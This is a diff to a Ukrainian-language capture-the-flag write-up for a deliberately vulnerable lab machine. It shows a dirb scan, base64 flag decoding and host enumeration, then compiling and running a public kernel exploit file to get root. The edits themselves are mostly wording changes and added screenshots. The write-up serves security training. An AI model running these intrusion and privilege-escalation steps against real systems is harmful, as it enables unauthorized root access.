@@ -55,8 +55,7 @@ dirb http://192.168.56.101
 
 ![robots](./src/robots.png)
 
-Спробуємо **декодувати** цей рядок через **Burp Decoder** та отримаємо **перший флаг**:
-Або скористатись командним рядком:
+Спробуємо **декодувати** цей рядок через командний рядок:
 
 ```sh
 echo "base64-Encoded-String" | base64 --decode
@@ -69,7 +68,7 @@ Flag1: https://t.me/SoftServeEducation
 ---
 
 ### **Крок 3: Отримання shell-доступу**
-Ми продовжили аналіз **HTML-коду** веб-сторінки та знайшли [[**ім'я користувача**]](/CAVulnlabs/AC-cybersploit/src/name_in_html.png) у коментарях:  
+Ми продовжили аналіз **HTML-коду** веб-сторінки та знайшли [[**ім'я користувача**]](./src/name_in_html.png) у коментарях:  
 
 ```plaintext
 Username: CSA
@@ -112,6 +111,8 @@ Flag1: https://career.softserveinc.com/uk-ua/learning-and-certification
 uname -a
 cat /etc/issue
 ```
+![robots](./src/issue.png)
+
 ```bash
 CSA@cybersploit-CTF:~$ uname -a
 Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
@@ -132,13 +133,16 @@ gcc 37292.c -o exploit
 ./exploit
 ```
 
-📌 **Результат**: **Отримано root-доступ!** 🎉  
+![robots](./src/root.png)
+
+**Результат**: **Отримано root-доступ!** 
 
 - Переходимо в директорію **/root/**, відкриваємо **фінальний флаг**:  
 
 ```sh
 cat finalflag.txt
 ```
+![robots](./src/finalflag.png)
 
 ```plaintext
 Flag3: You take the red pill… and I show you how deep the rabbit hole goes.
@@ -161,7 +165,7 @@ echo "TWF0cml4Cg==" | base64 --decode
 Matrix
 ```
 
-✅ **Фінальний флаг отримано! CTF завершено!** 🎯  
+**Фінальний флаг отримано! CTF завершено!**
 
 ---
 
